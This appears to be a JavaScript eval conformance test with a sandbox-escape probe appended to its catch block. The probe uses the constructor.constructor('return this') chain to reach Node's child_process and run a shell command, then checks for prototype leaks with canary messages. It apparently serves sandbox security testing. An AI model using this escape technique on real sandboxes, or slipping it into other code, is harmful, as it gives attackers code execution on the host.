try {
    var x = {};
    if (eval(x) !== x) {
        $ERROR('#1: x = {}; eval(x) === x. Actual: ' + eval(x));
    }
    x = new Number(1);
    if (eval(x) !== x) {
        $ERROR('#2: x = new Number(1); eval(x) === x. Actual: ' + eval(x));
    }
    x = new Boolean(true);
    if (eval(x) !== x) {
        $ERROR('#3: x = new Boolean(true); eval(x) === x. Actual: ' + eval(x));
    }
    x = new String('1+1');
    if (eval(x) !== x) {
        $ERROR('#4: x = new String("1"); eval(x) === x. Actual: ' + eval(x));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}